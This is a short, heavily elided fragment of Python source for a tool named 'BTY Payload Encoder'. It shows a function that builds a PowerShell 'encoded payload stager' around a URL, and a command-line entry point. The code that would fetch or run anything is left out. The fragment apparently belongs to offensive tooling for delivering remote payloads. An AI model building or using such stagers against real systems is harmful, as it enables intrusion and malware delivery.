...
def generate_ps1_stager(encoded_data, url):
    ...
    stager = f'''# BTY Encoded Payload Stager
$u="{url}"
...
def main():
    p = argparse.ArgumentParser(description="BTY Payload Encoder")
    ...
    print(f"{BOLD}{CYAN}BTY Payload Encoder{RESET}")
